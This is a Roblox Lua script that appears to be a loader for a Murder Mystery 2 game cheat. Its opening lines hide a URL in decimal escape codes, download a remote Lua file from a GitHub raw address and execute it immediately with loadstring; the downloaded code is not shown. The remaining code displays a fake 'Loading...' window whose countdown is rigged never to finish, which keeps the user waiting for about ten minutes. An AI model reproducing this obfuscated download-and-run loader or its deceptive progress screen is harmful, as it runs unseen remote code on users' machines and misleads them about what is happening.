local a = game
local b = a:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\106\110\115\99\114\105\112\116\115\47\77\109\50\101\120\101\99\117\116\101\114\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\72\101\108\112\109\109\50\46\108\117\97", true)
loadstring(b)()

local c = a.Players.LocalPlayer
local d = Instance.new("\83\99\114\101\101\110\71\117\105")
d.ResetOnSpawn = false  
d.Parent = c:WaitForChild("\80\108\97\121\101\114\71\117\105")

local e = Instance.new("\70\114\97\109\101")
e.Size = UDim2.new(0.3, 0, 0.2, 0)
e.Position = UDim2.new(0.35, 0, 0.4, 0)
e.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
e.BorderSizePixel = 2
e.Active = true  
e.Draggable = true  
e.Parent = d

local f = Instance.new("\84\101\120\116\76\97\98\101\108")
f.Size = UDim2.new(1, 0, 0.3, 0)
f.Position = UDim2.new(0, 0, 0.05, 0)
f.Text = "\76\111\97\100\105\110\103\46\46\46"
f.TextColor3 = Color3.fromRGB(255, 255, 255)
f.BackgroundTransparency = 1
f.Font = Enum.Font.SourceSansBold
f.TextScaled = true
f.Parent = e

local g = Instance.new("\84\101\120\116\76\97\98\101\108")
g.Size = UDim2.new(0.8, 0, 0.2, 0)
g.Position = UDim2.new(0.1, 0, 0.5, 0)
g.Text = "\53\32\115\101\99\111\110\100\115"
g.TextColor3 = Color3.fromRGB(255, 255, 255)
g.BackgroundTransparency = 1
g.Font = Enum.Font.SourceSans
g.TextScaled = true
g.Parent = e

local h = Instance.new("\70\114\97\109\101")
h.Size = UDim2.new(0.9, 0, 0.2, 0)
h.Position = UDim2.new(0.05, 0, 0.75, 0)
h.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
h.BorderSizePixel = 2
h.Parent = e

local i = Instance.new("\70\114\97\109\101")
i.Size = UDim2.new(0, 0, 1, 0)
i.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
i.Parent = h

local j = 600
local k = 5  

for l = 1, j do
    i.Size = UDim2.new(l / j, 0, 1, 0)
    g.Text = tostring(k) .. "\32\115\101\99\111\110\100\115"

    if l % 2 == 0 then
        k = math.floor(k - (k / 4))
    else
        k = k + 10
    end

    wait(1)
end

d:Destroy()
